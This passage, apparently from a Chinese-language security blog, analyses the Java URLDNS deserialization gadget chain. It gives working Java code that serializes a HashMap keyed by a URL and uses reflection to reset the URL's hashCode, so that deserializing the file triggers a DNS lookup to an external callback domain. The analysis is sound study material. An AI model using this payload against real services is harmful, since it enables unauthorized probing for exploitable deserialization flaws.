ysoserial工具的payload中多走了一步HashMap.putVal()，从Gadget Chain中可以看出我们只需要将HashMap.hash(Object,key)方法中的key传递一个URL对象，就会调用URL.hashCode()，hashCode=-1就会调用handler.hashCode(this)，就顺利调用getHostAddress(u)。 那么我们便可以构造代码验证一下 序列化HashMap对象 1234567891011121314151617import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.net.URL;import java.util.HashMap;public class Serialize &#123; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException&#123; URL url = new URL(&quot;http://7d144017.dns.1433.eu.org&quot;); HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;&gt;(); //HashMap&lt;K, V&gt;,K为URL对象，V随意 hashmap.put(url,1); ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(new File(&quot;HashMap.txt&quot;))); oo.writeObject(hashmap); &#125;&#125; 反序列化HashMap对象 1234567891011import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class UnSerialize &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File(&quot;HashMap.txt&quot;))); ois.readObject(); &#125;&#125; 这时出现了问题，在序列化的时候接收到了请求但是反序列化确没有接收到请求。 经过调试发现，序列化时会发生请求是因为put方法里面也调用了hash()，触发了URL.hashCode，而反序列化时不会发生请求是因为调用到URL.hashCode时，hashCode的值不等于-1，所以进入不到，handler.hashCode(this)，那我们只需要想办法当它序列化时值改为不等于-1的值，调用完put后把他的值改成-1就可以，那要怎么才能改变hashCode的值呢，这里就需要用到Java反射。 改进后的 1234567891011121314151617181920212223242526import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class Serialize &#123; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException &#123; URL url = new URL(&quot;http://e5e3bb79.dns.1433.eu.org&quot;); HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;&gt;(); //HashMap&lt;K, V&gt;,K为URL对象，V随意 Class c = url.getClass(); Field hashCode = c.getDeclaredField(&quot;hashCode&quot;); hashCode.setAccessible(true); hashCode.set(url,-2);//在put前将hashCode的值设置为-2 hashmap.put(url,1); hashCode.set(url,-1);//之后再设置回-1 ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(new File(&quot;HashMap.txt&quot;))); oo.writeObject(hashmap); &#125;&#125; 再次尝试，序列化时没有发送请求。 反序列化发送了请求 至此URLDNS分析完毕。","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java","slug":"java","permalink":"https://self209.github.io/tags/java/"}]}],"categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java","slug":"java","permalink":"https://self209.github.io/tags/java/"}]}